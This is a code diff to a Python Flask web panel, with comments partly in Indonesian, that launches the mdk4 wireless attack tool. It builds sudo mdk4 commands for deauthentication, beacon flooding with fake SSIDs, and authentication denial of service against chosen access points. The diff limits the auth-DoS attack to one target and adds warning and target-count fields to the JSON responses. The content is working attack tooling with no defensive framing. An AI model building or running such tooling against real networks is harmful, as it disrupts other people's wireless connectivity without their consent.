@@ -209,7 +209,7 @@ def start_mdk4():
     global attack_process, attack_running, attack_type, current_targets
     
     data = request.json
-    attack_type = data.get('type')  # 'deauth', 'beacon', 'authdos'
+    attack_type = data.get('type')
     targets = data.get('targets', [])
     interface = data.get('interface')
     
@@ -221,6 +221,8 @@ def start_mdk4():
     
     # Siapkan command berdasarkan tipe
     cmd = None
+    warning_msg = None
+    
     if attack_type == 'deauth':
         if targets and len(targets) > 0:
             # Multiple target via file
@@ -248,7 +250,7 @@ def start_mdk4():
             current_targets = []
             
     elif attack_type == 'beacon':
-        # Cari file ssid_list.txt
+        # Beacon doesn't need targets - auto deselect all
         ssid_file = find_ssid_file()
         if not ssid_file:
             return jsonify({"status": "error", "message": "ssid_list.txt not found in ssid-fake folder"})
@@ -259,18 +261,28 @@ def start_mdk4():
             "-m",
             "-s", "500"
         ]
+        current_targets = []  # Auto clear targets
         
     elif attack_type == 'authdos':
+        # 🔥 FIX: Auth DOS hanya support 1 target!
         if targets and len(targets) > 0:
+            # Ambil target pertama saja
             target = targets[0]
+            
+            # Kasih warning kalau lebih dari 1 target
+            if len(targets) > 1:
+                warning_msg = f"Auth DOS only supports 1 target! Using: {target['essid']} ({target['bssid']})"
+                print(f"[!] {warning_msg}")
+                print(f"[!] {len(targets)-1} other target(s) ignored")
+            
             cmd = [
                 "sudo", "mdk4", interface, "a",
                 "-a", target['bssid'],
                 "-s", "1000"
             ]
-            current_targets = [target]
+            current_targets = [target]  # Hanya 1 target
         else:
-            return jsonify({"status": "error", "message": "Auth DOS requires a target"})
+            return jsonify({"status": "error", "message": "Auth DOS requires 1 target"})
     
     if not cmd:
         return jsonify({"status": "error", "message": "Invalid attack type"})
@@ -280,11 +292,20 @@ def start_mdk4():
         attack_process = subprocess.Popen(cmd, preexec_fn=os.setsid)
         attack_running = True
         
-        return jsonify({
+        response = {
             "status": "success",
             "message": f"MDK4 {attack_type} started",
-            "type": attack_type
-        })
+            "type": attack_type,
+            "target_count": len(current_targets)
+        }
+        
+        # Tambahkan warning jika ada
+        if warning_msg:
+            response["warning"] = warning_msg
+            response["ignored"] = len(targets) - 1
+        
+        return jsonify(response)
+        
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
 
@@ -312,7 +333,8 @@ def attack_status():
     return jsonify({
         "running": attack_running,
         "type": attack_type,
-        "targets": current_targets
+        "targets": current_targets,
+        "target_count": len(current_targets)
     })
 
 def find_ssid_file():
